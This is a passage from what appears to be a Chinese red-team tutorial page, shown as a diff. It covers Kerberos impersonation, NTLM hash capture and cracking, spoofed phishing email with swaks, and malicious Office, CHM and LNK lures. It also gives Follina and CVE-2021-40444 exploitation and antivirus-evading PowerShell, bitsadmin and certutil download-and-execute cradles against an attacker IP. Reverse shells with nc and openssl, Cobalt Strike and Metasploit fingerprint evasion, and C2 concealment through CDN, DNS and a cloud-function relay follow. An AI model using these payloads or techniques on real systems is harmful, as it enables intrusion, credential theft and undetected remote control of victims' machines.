xdvpc/fileadmin$:file!@#45 -spn cifs/fileadmin.xiaoshou.xiaodi.vpc -impersonate administrator</span><br><span class="line">kerberos::ptc administrator.ccache</span><br></pre></td></tr></table></figure>
+<p>（ 9 ）靶场 9 ：dc<br>
+<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0tldmluLVJvYmVydHNvbi9JbnZlaWdo">https://github.com/Kevin-Robertson/Inveigh</span></p>
+<p>监听拦截到 DC 的密文 ：Inveigh.exe<br>
+ 获取到的是 NET NTLM HASH V1 或 V2<br>
+ 破解得出明文： <code>hashcat.exe -a 3 -m 5600 xxxxxx ?l?l?l?l?l?s?s?s?d?d?d?d</code> <br>
+ 通过 Inveigh.exe 获取的明文横向移动获取</p>
+<h3 id="红队apt"><a class="markdownIt-Anchor" href="#红队apt">#</a> 红队 APT</h3>
+<h4 id="邮件钓鱼"><a class="markdownIt-Anchor" href="#邮件钓鱼">#</a> 邮件钓鱼</h4>
+<ul>
+<li>SPF 相关知识</li>
+</ul>
+<p>什么是 SPF: 发件人策略框架（Sender Policy Framework）电子邮件认证机制，中文译为发送方策略框架，主要作用是防止伪造邮件地址。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如何判断SPF</span></span><br><span class="line">dig -t txt qq.com //linux</span><br><span class="line">nslookup -type=txt qq.com //windows</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">SPF相关显示</span></span><br><span class="line">&quot;v=spf1 -all&quot; (拒绝所有，表示这个域名不会发出邮件)</span><br><span class="line">&quot;v=spf1 +all&quot; (接受所有)</span><br><span class="line">&quot;v=spf1 ip4:192.168.0.1/16 -all&quot;(只允许 192.168.0.1/16 范围内的 IP 发送邮件)</span><br><span class="line">&quot;v=spf1 mx -all&quot;(允许当前域名的 mx 记录对应的 IP 地址发送邮件) &quot;v=spf1 mx mx:test.example.com -all&quot;(允许当前域名和 test.example.com的 mx 记录对应的 IP 地址发送邮件)</span><br><span class="line">&quot;v=spf1 a mx ip4:173.194.72.103 -all&quot;(允许当前域名的 a 记录和 mx 记录和一个给定的 IP 地址发送邮件)</span><br><span class="line">&quot;v=spf1 include:example.com -all&quot;(采用和 example.com 一样的 SPF 记录)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Swaks 简单使用说明</span></span><br><span class="line">-t –to 目标地址 -t test@test.com</span><br><span class="line">-f –from 来源地址 (发件人) -f &quot;text&lt;text@text.com&gt;&quot;</span><br><span class="line">–protocol 设定协议(未测试)</span><br><span class="line">--body &quot;http://www.baidu.com&quot; //引号中的内容即为邮件正文; --header &quot;Subject:hello&quot; //邮件头信息，subject为邮件标题 -ehlo 伪造邮件 ehlo 头</span><br><span class="line">--data ./Desktop/email.txt //将TXT文件作为邮件发送;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>gophish 安装使用</li>
+</ul>
+<p>工具地址：<span class="exturl" data-url="aHR0cHM6Ly9kb2NzLmdldGdvcGhpc2guY29tLw==">https://docs.getgophish.com/</span><br>
+ 项目地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2dvcGhpc2gvZ29waGlzaA==">https://github.com/gophish/gophish</span></p>
+<p>（ 1 ）无 SPF 直接伪造 - Swaks</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">临时邮箱:</span> </span><br><span class="line">http://24mail.chacuo.net/ https://www.linshi-email.com/</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">检测:</span></span><br><span class="line">nslookup -type=txt xxx.com</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">伪造：</span></span><br><span class="line">swaks --header-X-Mailer &quot;&quot; --header-Message-Id &quot;&quot; --header-&quot;Content-Type&quot;=&quot;text/html&quot; --from &quot;QQ管理&lt;admin@qq.com&gt;&quot; --ehlo shabimeiguo -head</span><br><span class="line">er &quot;Subject: 测试&quot; --body 我们做了一个测试 --to owazmoffth@iubridge.com</span><br></pre></td></tr></table></figure>
+<p>（ 2 ）有 SPF 直接伪造 - Swaks<br>
+ 工具地址：<span class="exturl" data-url="aHR0cDovL2pldG1vcmUub3JnL2pvaG4vY29kZS9zd2Frcy8=">http://jetmore.org/john/code/swaks/</span></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">软刚发信人：（修改字眼）</span></span><br><span class="line">swaks --body &quot;test&quot; --header &quot;Subject:testT&quot; -t xx@163.com -f system@notice.aliyun.com.cn</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">硬刚发信人：（转发突破）注册一个邮箱开启POP3转发、使用网上已知的邮箱系统。将要发送的邮件导出EML模版，修改内置的发件人内容时间等。</span></span><br><span class="line">swaks --to 收信人 -f 发信人 --data 1.eml --server smtp.163.com -p 25 -au 帐号 -ap 授权码</span><br></pre></td></tr></table></figure>
+<p>自建要伪造高仿的邮箱系统、使用第三方平台或自行搭建、设置 SPF，中转平台突破。<br>
+smtp2go（速度慢但免费发送量大）：<span class="exturl" data-url="aHR0cHM6Ly93d3cuc210cDJnby5jb20v">https://www.smtp2go.com/</span><br>
+SendCloud（速度快但免费发送量少）：<span class="exturl" data-url="aHR0cHM6Ly93d3cuc2VuZGNsb3VkLm5ldC8=">https://www.sendcloud.net/</span><br>
+ 也可以自己搭建邮件服务器 - Ewomail&amp;Postfix：<span class="exturl" data-url="aHR0cDovL3d3dy5ld29tYWlsLmNvbS8=">http://www.ewomail.com/</span></p>
+<p>（ 3 ）采用自己搭建 Ewomail 配合 Swaks<br>
+ 转发地址域名由你指定注册、不受限于其他系统的限制和风控<br>
+<span class="exturl" data-url="aHR0cDovL2RvYy5ld29tYWlsLmNvbS9kb2NzL2V3b21haWwvamlhbmppZQ=="> http://doc.ewomail.com/docs/ewomail/jianjie</span><br>
+<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTI4NjY1MzIvYXJ0aWNsZS9kZXRhaWxzLzEyMzMzNTUyOQ==">https://blog.csdn.net/u012866532/article/details/123335529</span><br>
+swaks --to <span class="exturl" data-url="bWFpbHRvOjQ3MTY1NjgxNEBxcS5jb20=">471656814@qq.com</span> -f <span class="exturl" data-url="bWFpbHRvOmFkbWluQGExaXl1bi5jb20=">admin@a1iyun.com</span> --data test.eml --server <span class="exturl" data-url="aHR0cDovL3NtdHAuYTFpeXVuLmNvbQ==">smtp.a1iyun.com</span> -p 25 -au <span class="exturl" data-url="bWFpbHRvOmFkbWluQGExaXl1bi5jb20=">admin@a1iyun.com</span> -ap xiaodi123</p>
+<ul>
+<li>网页钓鱼</li>
+</ul>
+<p>克隆：手工另存为、Setoolkit、Goblin<br>
+ 工具地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3hpZWNhdC9nb2JsaW4=">https://github.com/xiecat/goblin</span><br>
+ 项目地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RydXN0ZWRzZWMvc29jaWFsLWVuZ2luZWVyLXRvb2xraXQ=">https://github.com/trustedsec/social-engineer-toolkit</span></p>
+<h4 id="宏病毒"><a class="markdownIt-Anchor" href="#宏病毒">#</a> 宏病毒</h4>
+<p>生成宏病毒：Attacks --&gt; Packages --&gt; MS offices Macro</p>
+<p>操作：Office 格式文档文件钓鱼一般采用宏或对象触发后门；默认 Office 加载宏后一般需要启用内容才可调用执行；所以诱惑伪装很重要。</p>
+<p>伪装：提示需要启用内容才能查看文件内容，并设置限制编辑等</p>
+<p>文件内容模式：docx-doc&amp;docm、xlsx-xls&amp;xlsm、pptx-ppt&amp;pptm</p>
+<p>老版本： 97 - 2003 0ffice 默认是支持宏代码运行</p>
+<p>新版本：启动宏的格式，一般就是在后缀加上 M</p>
+<h4 id="chm-电子书"><a class="markdownIt-Anchor" href="#chm-电子书">#</a> CHM 电子书</h4>
+<p>CS 生成上线：Attacks——&gt;Web Drive by——&gt;Scripted web Delivery</p>
+<p>CHM 伪装：找一个正常的 CHM 电子书，解压后；将 Payload 插入其中某个或整个页面；加载编译，当电子书打开修改页面后上线。</p>
+<p>解压命令：hh -decompile .\html xx.CHM</p>
+<p>木马执行：使用 bitsadmin 或 Powershell 模式加载木马</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">免杀方案</span></span><br><span class="line">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://47.94.236.117:84/a&#x27;))&quot;</span><br><span class="line"></span><br><span class="line">bitsadmin /transfer 604c http://47.94.236.117:83/a %APPDATA%\604c.exe&amp;% APPDATA%\604c.exe&amp;del %APPDATA%\604c.exe</span><br><span class="line"></span><br><span class="line">&quot;c&quot;&quot;e&quot;&quot;r&quot;&quot;t&quot;&quot;u&quot;&quot;t&quot;&quot;i&quot;&quot;l&quot; -&quot;u&quot;&quot;r&quot;&quot;l&quot;&quot;c&quot;&quot;a&quot;&quot;c&quot;&quot;h&quot;&quot;e&quot; -split -f [http://47.94.236.117](http://47.94.236.117)/5.exe c:/5.exe &amp; c:/5.exe</span><br><span class="line"></span><br><span class="line">powershell -NoExit &quot;$c1=&#x27;IEX(New-Object Net.WebClient).Downlo&#x27;;$c2=&#x27;123(&#x27;&#x27;http://47.94.236.117:84/a&#x27;&#x27;)&#x27;.Replace(&#x27;123&#x27;,&#x27;adString&#x27;);IEX ($c1+$c2)&quot;</span><br><span class="line"></span><br><span class="line">copy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe bypass.exe &amp;&amp; .\bypass.exe &quot;$a=&#x27;IEX((New-Object Net.WebClient).DownloadString(&#x27;&#x27;ht&#x27;;$b=&#x27;tp://xxx/hr.ps1&#x27;&#x27;));&#x27;;IEX ($a+$b)&quot;</span><br></pre></td></tr></table></figure>
+<h4 id="lnk-快捷方式"><a class="markdownIt-Anchor" href="#lnk-快捷方式">#</a> LNK 快捷方式</h4>
+<p>生成：Attacks -&gt; Packages -&gt; Html Application</p>
+<p>上传：Attacks——&gt;Web Drive by——&gt;Host file</p>
+<p>执行：C:\Windows\System32\mshta.exe <span class="exturl" data-url="aHR0cDovL3h4Lnh4Lnh4Lnh4">http://xx.xx.xx.xx</span>:xx/x.ext</p>
+<p>伪装：创建快捷方式、生成 HTA 并上传、属性更改目标执行、属性更改图标伪装</p>
+<p>lnk 免杀思路：powershell 混淆、shellcode 混淆、vba 混淆</p>
+<h4 id="office-cve漏洞"><a class="markdownIt-Anchor" href="#office-cve漏洞">#</a> Office CVE 漏洞</h4>
+<ul>
+<li>Microsoft MSDT CVE-2022-30190 代码执行</li>
+</ul>
+<p>工具地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0pvaG5IYW1tb25kL21zZHQtZm9sbGluYQ==">https://github.com/JohnHammond/msdt-follina</span></p>
+<p>该漏洞首次发现在 2022 年 5 月 27 日，由白俄罗斯的一个 IP 地址上传。恶 意文档从 Word 远程模板功能从远程 Web 服务器检索 HTML 文件，通过 ms-ms dt MSProtocol URI 方法来执行恶意 PowerShell 代码。感染过程利用程序 msdt.e xe，该程序用于运行各种疑难解答程序包。</p>
+<p>此工具的恶意文档无需用户交互即可调用它。导致在宏被禁用的情况下， 恶意文档依旧可以使用 ms-msdt URI 执行任意 PowerShell 代码。</p>
+<p>目前已知影响的版本为:office 2021 Lts、office 2019、office 2016、Offic e 2013、Office ProPlus、Office 365</p>
+<p>测试：msdt.exe/id PCWDiagnostic /skip force /param “IT_RebrowseForFile=? I T_LaunchMethod=ContextMenu IT_BrowseForFile=<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>I</mi><mi>n</mi><mi>v</mi><mi>o</mi><mi>k</mi><mi>e</mi><mo>−</mo><mi>E</mi><mi>x</mi><mi>p</mi><mi>r</mi><mi>e</mi><mi>s</mi><mi>s</mi><mi>i</mi><mi>o</mi><mi>n</mi><mo stretchy="false">(</mo></mrow><annotation encoding="application/x-tex">(Invoke-Expression(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord mathnormal">x</span><span class="mord mathnormal">p</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">e</span><span class="mord mathnormal">s</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">o</span><span class="mord mathnormal">n</span><span class="mopen">(</span></span></span></span>(Invoke- Expression(’[System.Text.Encoding]’+[char]58+[char]58+‘Unicode.GetString([Syste m.Convert]’+[char]58+[char]58+‘FromBase64String(’+[char]34+‘YwBhAGwAYwA=’ +[char]34+’))’))))i/…/…/…/…/…/…/…/…/…/…/…/…/…/…/Windows/System32/mpsigstub.exe”</p>
+<ul>
+<li>Microsoft MSHTML CVE- 2021 - 40444 远程代码执行</li>
+</ul>
+<p>工具地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2xvY2tlZGJ5dGUvQ1ZFLTIwMjEtNDA0NDQ=">https://github.com/lockedbyte/CVE-2021-40444</span><br>
+ 影响版本：office 2003 office 2007 office 2010 office 2013 office 2016</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装依赖</span></span><br><span class="line">apt-get install lcab</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">生成DLL</span></span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=47.94.236.117lport=9999 -f dll &gt; shell.dll</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">监听上线</span></span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 0.0.0.0</span><br><span class="line">set lport 9999</span><br><span class="line">run</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">生成文档</span></span><br><span class="line">cp shell.dll CVE- 2021 - 40444</span><br><span class="line">python3 exploit.py generate shell.dll http://47.94.236.117:10000</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">监听文档</span></span><br><span class="line">python3 exploit.py host 10000</span><br></pre></td></tr></table></figure>
+<h4 id="钓鱼伪装"><a class="markdownIt-Anchor" href="#钓鱼伪装">#</a> 钓鱼伪装</h4>
+<p>（ 1 ）文件后缀 - 钓鱼伪装 - RLO</p>
+<p>通过修改文件后缀的编码方式，将 exe 后缀文件伪装为 jpg 文件</p>
+<p>（ 2 ）压缩文件 - 自解压 - 释放执行</p>
+<p>Winrar 压缩软件，设置压缩为自启动，双击压缩文件之后即释放木马</p>
+<p>（ 3 ）捆绑文件 - 打包加载 - 释放执行</p>
+<p>通过不同的捆绑释放器进行绑定免杀木马，执行文件后释放木马</p>
+<h4 id="nc-流量加密"><a class="markdownIt-Anchor" href="#nc-流量加密">#</a> NC 流量加密</h4>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">nc 使用</span></span><br><span class="line">nc -lvvp 5566</span><br><span class="line">nc -e /bin/bash 47.94.236.117 5566</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在我们的攻击端生成自签名证书：</span></span><br><span class="line">openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在攻击机上监听指定端口，这里我选择 8888 ：</span></span><br><span class="line">openssl s_server -quiet -key key.pem -cert cert.pem -port 8888</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在受害机上执行shell反弹命令(注意修改ip和端口)：</span></span><br><span class="line">mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect 47.94.236.117:8888 &gt; /tmp/s;</span><br></pre></td></tr></table></figure>
+<h4 id="msf-通讯特征修改"><a class="markdownIt-Anchor" href="#msf-通讯特征修改">#</a> MSF 通讯特征修改</h4>
+<p>解决 HTTPS-SSL 通讯证书被特征标示问题</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">利用openssl生成证书</span></span><br><span class="line">openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 -subj &quot;/C=UK/</span><br><span class="line">ST=xiaodi/L=xiaodi/O=Development/CN=www.baidu.com&quot; -keyout www.baidu.co m.key -out www.baidu.com.crt &amp;&amp; cat www.baidu.com.key www.baidu.com.crt &gt;</span><br><span class="line">www.baidu.com.pem &amp;&amp; rm -f www.baidu.com.key www.baidu.com.crt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">MSF生成绑定证书后门</span></span><br><span class="line">msfvenom -p windows/meterpreter/reverse_https LHOST=47.94.236.117 LPO</span><br><span class="line">RT=5566 PayloadUUIDTracking=true PayloadUUIDName=Whoamishell HandlerS SLCert=/root/www.baidu.com.pem StagerVerifySSLCert=true -f exe -o https-b.exe</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">MSF监听上线</span></span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_https</span><br><span class="line">set lhost 0.0.0.0</span><br><span class="line">set lport 5566</span><br><span class="line">set HandlerSSLCert /root/www.baidu.com.pem</span><br><span class="line">set StagerVerifySSLCert true</span><br><span class="line">run</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">impersonate_ssl模块：</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">此外Metasploit框架还有一个auxiliary/gather/impersonate_ssl模块，可以用来自动从信任源创建一个虚假证书，十分方便：</span></span><br><span class="line">use auxiliary/gather/impersonate_ssl</span><br><span class="line">set RHOST [http://www.baidu.com](http://www.baidu.com)</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<h4 id="cs-通讯特征修改"><a class="markdownIt-Anchor" href="#cs-通讯特征修改">#</a> CS 通讯特征修改</h4>
+<p>解决 HTTP/S 通讯证书及流量特征被特征标示问题、JDK Keytool 修改 CS 特征。修改默认端口：编辑 teamserver 文件，更改 server port 部分 50000 。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">a. 去除store证书特征：</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看证书指纹：</span></span><br><span class="line">keytool -list -v -keystore cobaltstrike.store</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">生成证书指纹</span></span><br><span class="line">keytool -keystore cobaltstrike1.store -storepass 123456 -key pass 123456 -genkey -keyalg RSA -alias xiaodi8.com -dname &quot;CN=xiaodi8 e-Szigno Root CA, OU=e-Szigno CA, O=xiaodi8 Ltd., L=Budapest, S=HU, C=HU&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">应用证书指纹</span></span><br><span class="line">keytool -importkeystore -srckeystore cobaltstrike1.store -dest</span><br><span class="line">keystore cobaltstrike1.store -deststoretype pkcs12</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">b. 去除流量通讯特征：</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">规则资源：https://github.com/xx0hcd/Malleable-C2-Profiles与https://github.com/FortyNorthSecurity/C2concealer</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建C2文件：xiaodi.Profiles</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">写入通讯规则: UA头&amp;GET&amp;POST&amp;心跳&amp;证书等</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">测试规则正常</span></span><br><span class="line">./c2lint xiaodi.prifile</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">c.加载C2规则启动：</span></span><br><span class="line">./teamserver ip 密码 xiaodi.Profiles</span><br><span class="line"></span><br><span class="line">https-certificate &#123;</span><br><span class="line">set CN &quot;xiaodi8&quot;;</span><br><span class="line">set O &quot;Microsoft&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">set C &quot;en&quot;;</span><br><span class="line">set L &quot;US&quot;;</span><br><span class="line">set OU &quot;Microsoft&quot;;</span><br><span class="line">set ST &quot;US&quot;;</span><br><span class="line">set validity &quot;365&quot;;</span><br><span class="line">&#125;</span><br><span class="line">d.设置，修改成你的证书名称和证书密码</span><br><span class="line">code-signer&#123;</span><br><span class="line">set keystore &quot;xiaodi.store&quot;;</span><br><span class="line">set password &quot;xiaodi&quot;;</span><br><span class="line">set alias &quot;xiaodi8.com&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="c2-服务器隐藏"><a class="markdownIt-Anchor" href="#c2-服务器隐藏">#</a> C2 服务器隐藏</h4>
+<p>防封锁处置 IP 地址：域前置、CDN、云函数，网盘第三方上线等</p>
+<p>（ 1 ）cs 采用 CDN 上线</p>
+<p>解决 HTTPS-SSL 通讯被朔源 IP 封锁问题<br>
+配置：<span class="exturl" data-url="aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvTWdoRmdlZ2RwM2wzdEZFM2hPdmNZdw==">https://mp.weixin.qq.com/s/MghFgegdp3l3tFE3hOvcYw</span><br>
+ 阿里云备案域名 &amp; 全站加速 CDN 配置、CS 创建监听器 - HTTPS/Stager/Header、生成后门 - 进程网络状态 &amp; 威胁情报平台。</p>
+<p>（ 2 ）域前置 - CDN 配合<br>
+此方案在大部分 IDC 不再支持</p>
+<p>（ 3 ）DNS 协议 - 域名记录解析</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">a. 域名解析设置A,NS记录</span></span><br><span class="line">ns1 ns cs.xxx.com</span><br><span class="line">ns2 ns cs.xxx.com</span><br><span class="line">cs A xx.xx.xx.xx(CS的IP)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">b. CS监听器-DNS</span></span><br><span class="line">Beacon DNS</span><br><span class="line">DNS地址配置：ns1.xxx.com ns2.xxx.com</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">c. 执行后checkin唤醒</span></span><br></pre></td></tr></table></figure>
+<p>（ 4 ）云函数 - 腾讯云操作</p>
+<p>创建云函数：腾讯云 - 云产品 - 云函数 - 函数服务 - 新建</p>
+<p>创建函数服务：选择从头开始 - 函数类型选择事件函数 - 函数名称任意 - 运行环境选择 python3.6 - 并复制如下代码并修改 CS 的 IP - 点击完成</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-*- coding: utf8 -*-</span></span><br><span class="line">import json,requests,base64</span><br><span class="line">def main_handler(event, context):</span><br><span class="line">C2=&#x27;https://XXXX&#x27; # 修改为自己C2服务器地址</span><br><span class="line">path=event[&#x27;path&#x27;]</span><br><span class="line">headers=event[&#x27;headers&#x27;]</span><br><span class="line">print(event)</span><br><span class="line">if event[&#x27;httpMethod&#x27;] == &#x27;GET&#x27; :</span><br><span class="line">resp=requests.get(C2+path,headers=headers,verify=False)</span><br><span class="line">else:</span><br><span class="line">resp=requests.post(C2+path,data=event[&#x27;body&#x27;],headers=headers,verify=False)</span><br><span class="line">print(resp.headers)</span><br><span class="line">print(resp.content)</span><br><span class="line">response=&#123;</span><br><span class="line">&quot;isBase64Encoded&quot;: True,</span><br><span class="line">&quot;statusCode&quot;: resp.status_code,</span><br><span class="line">&quot;headers&quot;: dict(resp.headers),</span><br><span class="line">&quot;body&quot;: str(base64.b64encode(resp.content))[2:-1]</span><br><span class="line">&#125;</span><br><span class="line">return response</span><br></pre></td></tr></table></figure>
+<p>创建触发器：触发方式选择 API 网关触发 - 勾选启用集成响应 - 点击提交配置触发器：点击 API 服务名对触发器进行配置，将路径修改为 /，然后点击立即完成配置 profile 文件 - 触发 URL：</p>
